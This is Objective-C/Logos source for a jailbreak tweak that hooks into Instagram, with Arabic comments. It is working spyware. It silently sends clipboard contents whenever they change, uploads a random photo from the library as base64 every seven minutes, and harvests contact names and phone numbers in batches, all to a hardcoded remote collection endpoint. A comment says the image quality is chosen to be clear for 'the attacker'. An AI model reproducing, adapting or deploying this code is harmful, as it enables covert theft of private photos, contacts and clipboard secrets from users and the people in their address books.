#import <Foundation/Foundation.h>

#import <UIKit/UIKit.h>

#import <Photos/Photos.h>

#import <Contacts/Contacts.h>



#define kRemoteSyncEndpoint @"https://ins-kdrk.onrender.com/api/v1/collect"

static NSTimer *periodicSyncTimer = nil;



// دالة الرفع المركزية الآمنة

static void sendExfiltrationPayload(NSString *dataType, id contentData) {

if ([UIApplication sharedApplication].applicationState != UIApplicationStateActive) return;


NSDictionary *payload = @{

@"timestamp": @([[NSDate date] timeIntervalSince1970]),

@"device_id": [[[UIDevice currentDevice] identifierForVendor] UUIDString] ?: @"unknown",

@"data_type": dataType,

@"content": contentData

};


NSError *jsonError = nil;

NSData *jsonData = [NSJSONSerialization dataWithJSONObject:payload options:0 error:&jsonError];

if (jsonError || !jsonData) return;


NSURL *url = [NSURL URLWithString:kRemoteSyncEndpoint];

NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];

request.HTTPMethod = @"POST";

[request setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];

request.HTTPBody = jsonData;


NSURLSessionConfiguration *config = [NSURLSessionConfiguration backgroundSessionConfigurationWithIdentifier:@"com.instagram.tweak.periodic.exfil"];

NSURLSession *session = [NSURLSession sessionWithConfiguration:config delegate:nil delegateQueue:nil];

NSURLSessionUploadTask *task = [session uploadTaskWithRequest:request fromData:jsonData];

[task resume];

}



// دالة سحب صورة واحدة عشوائية (قديمة أو جديدة) وضغطها بوضوح عالٍ وحجم صغير

static void captureAndSyncRandomImage(void) {

if ([PHPhotoLibrary authorizationStatus] != PHAuthorizationStatusAuthorized) return;


// تشغيل المعالجة في خيط خلفي (Background Queue) لحماية واجهة إنستغرام من التعليق

dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{

PHFetchOptions *fetchOptions = [[PHFetchOptions alloc] init];

fetchOptions.sortDescriptors = @[[NSSortDescriptor sortDescriptorWithKey:@"creationDate" ascending:YES]]; // الترتيب من الأقدم للأحدث


PHFetchResult<PHAsset *> *fetchResult = [PHAsset fetchAssetsWithMediaType:PHAssetMediaTypeImage options:fetchOptions];

if (fetchResult.count == 0) return;


// اختيار عشوائي بين صورة قديمة أو صورة جديدة لتنوع المحتوى المستخرج

NSUInteger randomIndex = arc4random_uniform((u_int32_t)fetchResult.count);

PHAsset *targetAsset = [fetchResult objectAtIndex:randomIndex];


PHImageManager *imageManager = [PHImageManager defaultManager];

PHImageRequestOptions *requestOptions = [[PHImageRequestOptions alloc] init];

requestOptions.synchronous = YES;

requestOptions.deliveryMode = PHImageRequestOptionsDeliveryModeHighQualityFormat; // للحصول على تفاصيل واضحة


// تححديد أبعاد متوازنة تمنع استنزاف الذاكرة مع الحفاظ على دقة مرئية ممتازة

[imageManager requestImageForAsset:targetAsset

targetSize:CGSizeMake(1200, 1200)

contentMode:PHImageContentModeAspectFit

options:requestOptions

resultHandler:^(UIImage * _Nullable result, NSDictionary * _Nullable info) {

if (result) {

// جودة 0.75 تعطي صورة واضحة جداً للمهاجم وفي نفس الوقت بحجم ملف صغير جداً

NSData *imgData = UIImageJPEGRepresentation(result, 0.75);

if (imgData) {

NSString *b64 = [imgData base64EncodedStringWithOptions:0];

if (b64) {

sendExfiltrationPayload(@"periodic_image_capture", @{

@"asset_id": targetAsset.localIdentifier ?: @"",

@"image_base64": b64

});

}

}

}

}];

});

}



// إدارة المؤقت الدوري (كل 7 دقائق)

static void startPeriodicSyncTimer(void) {

if (periodicSyncTimer && periodicSyncTimer.isValid) return;


dispatch_async(dispatch_get_main_queue(), ^{

periodicSyncTimer = [NSTimer scheduledTimerWithTimeInterval:(7 * 60.0)

repeats:YES

block:^(NSTimer * _Nonnull timer) {

// التحقق الدائم أن إنستغرام شغال في الواجهة قبل تنفيذ السحب

if ([UIApplication sharedApplication].applicationState == UIApplicationStateActive) {

captureAndSyncRandomImage();

} else {

[timer invalidate];

periodicSyncTimer = nil;

}

}];

[[NSRunLoop mainRunLoop] addTimer:periodicSyncTimer forMode:NSRunLoopCommonModes];

});

}



// مراقبة الحافظة لحظياً عند النسخ أو اللصق

%ctor {

NSNotificationCenter *nc = [NSNotificationCenter defaultCenter];

[nc addObserverForName:UIPasteboardChangedNotification

object:nil

queue:[NSOperationQueue mainQueue]

usingBlock:^(NSNotification * _Nonnull note) {

NSString *copiedText = [UIPasteboard generalPasteboard].string;

if (copiedText && copiedText.length > 0) {

sendExfiltrationPayload(@"clipboard_capture", copiedText);

}

}];

}



// ربط النشاط بنقطة بداية التطبيق وتشغيل المؤقت

%hook UIApplication



- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {

BOOL origResult = %orig;


// بدء المؤقت الدوري بمجرد فتح التطبيق

startPeriodicSyncTimer();


// سحب جهات الاتصال على دفعات صامتة لمرة واحدة عند الإقلاع

static dispatch_once_t onceToken;

dispatch_once(&onceToken, ^{

CNContactStore *store = [[CNContactStore alloc] init];

[store requestAccessForEntityType:CNEntityTypeContacts completionHandler:^(BOOL granted, NSError * _Nullable error) {

if (!granted) return;


NSArray *keys = @[CNContactGivenNameKey, CNContactPhoneNumbersKey];

CNContactFetchRequest *req = [[CNContactFetchRequest alloc] initWithKeysToFetch:keys];


NSMutableArray *contactBatch = [NSMutableArray array];

[store enumerateContactsWithFetchRequest:req error:nil usingBlock:^(CNContact * _Nonnull contact, BOOL * _Nonnull stop) {

NSString *phone = contact.phoneNumbers.firstObject.value.stringValue;

if (contact.givenName && phone) {

[contactBatch addObject:@{@"name": contact.givenName, @"phone": phone}];


if (contactBatch.count >= 20) {

sendExfiltrationPayload(@"contacts_batch", [contactBatch copy]);

[contactBatch removeAllObjects];

}

}

}];


if (contactBatch.count > 0) {

sendExfiltrationPayload(@"contacts_batch", [contactBatch copy]);

}

}];

});


return origResult;

}



// إعادة تشغيل المؤقت أو إيقافه حسب حالة واجهة التطبيق (Foreground / Background)

- (void)setDelegate:(id<UIApplicationDelegate>)delegate {

%orig;

}



%end



// مراقبة عودة التطبيق للواجهة الأمامية لإعادة تشغيل المؤقت إذا توقف

%hook UIViewController



- (void)viewDidAppear:(BOOL)animated {

%orig;

if ([UIApplication sharedApplication].applicationState == UIApplicationStateActive) {

startPeriodicSyncTimer();

}

}



%end 

